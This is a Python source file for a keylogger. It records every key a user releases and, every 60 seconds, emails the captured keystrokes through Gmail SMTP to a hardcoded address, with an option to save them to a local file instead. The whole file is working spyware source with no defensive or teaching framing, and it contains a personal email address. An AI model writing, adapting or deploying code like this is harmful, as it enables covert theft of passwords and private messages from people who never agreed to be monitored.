import keyboard # for keylogs
import smtplib  # smtp protocol
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "thanhnguyentien678@gmail.com"
EMAIL_PASSWORD = "**************"

class Keylogger:
    def __init__(self, interval, report_method = "email"):
        self.interval = interval                       # declare the interval of Keylogger
        self.report_method = report_method             # declare the method sending the log
        self.log = ""                                  # create a string variable that contains the log of all
        self.start_dt = datetime.now()                 # setting start & end datetime record
        self.end_dt = datetime.now()                   # setting start & end datetime record
    def callback(self, event):
        # this callback is called when a keyboard event is occurred
        name = event.name
        if len(name) > 1:
            # not a character, special key
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace space with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # add the key name to our global "self.log" variable
        self.log += name
    # report our keylog to a local file
    def update_filename(self):
        # construct the filename to be identified by start end datetime
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    def report_to_file(self):
        # create a log file in the current directory that contains the current keylogs in the "self.log" variable
        # open the file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file = f)
        print(f"[+] Saved {self.filename}.txt")
    def sendmail(self, email, password, message):
        # manage a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminate the session
        server.quit()
    def report(self):
        # this function gets called every "self.interval"
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update "self.filename"
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt == datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait("esc")

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()